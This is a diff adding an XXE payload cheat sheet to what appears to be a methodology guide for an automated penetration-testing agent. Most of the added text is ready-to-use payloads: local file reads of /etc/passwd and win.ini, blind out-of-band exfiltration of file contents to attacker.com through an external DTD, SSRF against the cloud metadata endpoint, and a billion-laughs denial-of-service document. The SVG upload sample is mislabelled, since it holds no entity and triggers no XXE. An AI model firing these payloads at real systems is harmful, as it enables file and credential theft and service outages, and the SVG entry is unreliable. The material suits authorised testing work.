@@ -580,3 +580,92 @@ Reason in escalating order of intrusiveness. First confirm the parser processes 
 ## Verification & Impact
 
 A finding is CONFIRMED when the raw response contains resolved entity content (e.g., `root:x:0:0` for a passwd read), a matching OAST callback carries the exfiltrated data, or an error message embeds file contents. It is SUSPECTED when entities appear declared/processed but no data is returned and no callback fires — record it as a candidate needing OOB confirmation. Document impact by concrete capability proven: local file disclosure (name the files), internal SSRF reach (name the internal host/metadata endpoint hit), credential theft from metadata, or DoS with measured resource impact. Always capture the full request/response pair via `recordEvidence`.
+
+---
+
+## Cheat Sheet — XXE Payloads
+
+### Classic File Read (In-Band)
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+### Windows File Read
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>&xxe;</root>
+```
+
+### Blind OOB Exfiltration
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root>&send;</root>
+```
+
+**evil.dtd:**
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
+%param;
+```
+
+### Parameter Entity Exfil
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+  %eval;
+]>
+<root>&exfil;</root>
+```
+
+### SSRF via XXE
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>&xxe;</root>
+```
+
+### SVG Upload XXE
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <defs>
+    <text id="xxe" x="0" y="20">XXE</text>
+  </defs>
+  <use xlink:href="#xxe"/>
+</svg>
+```
+**Upload as `.svg` file — triggers XML parser on server.**
+
+### Billion Laughs (DoS)
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<root>&lol4;</root>
+```
